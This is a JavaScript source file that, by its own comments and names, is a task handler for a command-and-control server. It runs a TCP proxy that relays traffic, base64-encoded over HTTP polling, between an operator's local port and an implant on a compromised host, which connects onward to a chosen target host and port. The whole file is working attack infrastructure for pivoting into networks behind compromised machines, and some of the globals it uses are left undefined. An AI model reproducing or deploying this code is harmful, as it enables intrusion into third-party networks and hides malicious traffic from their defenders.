//TCP Proxy Task Handler Constructor
import fs from 'fs'
import net from 'net'
export class TaskHandler {
  constructor(task) {
    this.task = task
    this.lport = JSON.parse(this.task.parameters).lport
    this.rhost = JSON.parse(this.task.parameters).rhost
    this.rport = JSON.parse(this.task.parameters).rport
    let display = `TCP Proxy Target ${this.rhost} Port: ${this.rport}`
    let task_display = db.prepare(`UPDATE tasks SET display = $display WHERE id = $task_id`)
    task_display.run({ task_id: this.task.id, display: display})
    this.task.display = display
    //create variable for current data chunk
    this.queue = []
    this.localsocket = null
    this.socket_open = true
    var task_handler = this
    this.server = net.createServer(localsocket => {
      //expose socket to other functions through this.server object
      task_handler.localsocket = localsocket
      // listen connection to proxy port on the C2 Server
      localsocket.on('connect', function (data) {
        console.log(">>> connection #%d from %s:%d",
          server.connections,
          localsocket.remoteAddress,
          localsocket.remotePort
        );
      });

      localsocket.on('data', function (data) {
        console.log("%s:%d - writing data to remote",
          localsocket.remoteAddress,
          localsocket.remotePort
        );

        //slice 1024 bytes from data and store in this.chunk
        console.log(data)
        task_handler.queue = task_handler.queue.concat([...data])
        console.log(task_handler.queue)
        console.log("queing bytes:" + task_handler.queue.length)
        // var flushed = (task_handler.chunk.length < 1024);
        // if (!flushed) {
        //   console.log("  remote not flushed; pausing local");
        //   localsocket.pause();
        // }
      });
      localsocket.on('close', function (had_error) {
        console.log("%s:%d - closing remote",
          localsocket.remoteAddress,
          localsocket.remotePort
        );

        task_handler.socket_open = false
        task_handler.queue = Buffer.from('close')
      });

    })
    this.server.listen(this.lport)
  }
  getTask = async function (req, res) {
    //add our task id to the payload
    let instruction = `${this.task.id}:${this.rhost}:${this.rport}`
    res.send(instruction)
  }
  taskIO = async function (req, res) {
    // if this.chunk is empty, then we have reached the end of our incoming data
    if (req.body != '') {
      if (req.body == 'get_command') {
        if (this.localsocket == null) {
          res.type('text/plain').send('')
        } else {
          if (this.socket_open) {
            res.type('text/plain').send('connect')
          } else {
            this.task.output = `Closing Socket: ${this.rhost}:${this.rport}`
            this.localsocket.end()
            this.server.close()
            this.task.completed_at = Date.now();
            let task_io = db.prepare(`UPDATE tasks SET (output, completed_at) = ($output, $completed_at) WHERE id = $task_id`)
            task_io.run({ task_id: this.task.id, output: this.task.output, completed_at: this.task.completed_at })
            io('task_complete', this.task)
            delete active_implant_handlers[this.task.id]
            res.type('text/plain').send('close')
          }
        }
      } else {
        this.localsocket.write(Buffer.from(req.body, 'base64'))

        if (this.queue.length > 0) {
          res.type('text/plain').send(Buffer.from(this.queue).toString('base64'))
          this.queue = []
        } else {
          res.type('text/plain').send('')
        }
      }

    } else {
      if (this.queue.length > 0) {
        res.type('text/plain').send(Buffer.from(this.queue).toString('base64'))
        this.queue = []
      } else {
        res.type('text/plain').send('')
      }
      // this.server.localsocket.emit('resume')
    }
  }
}

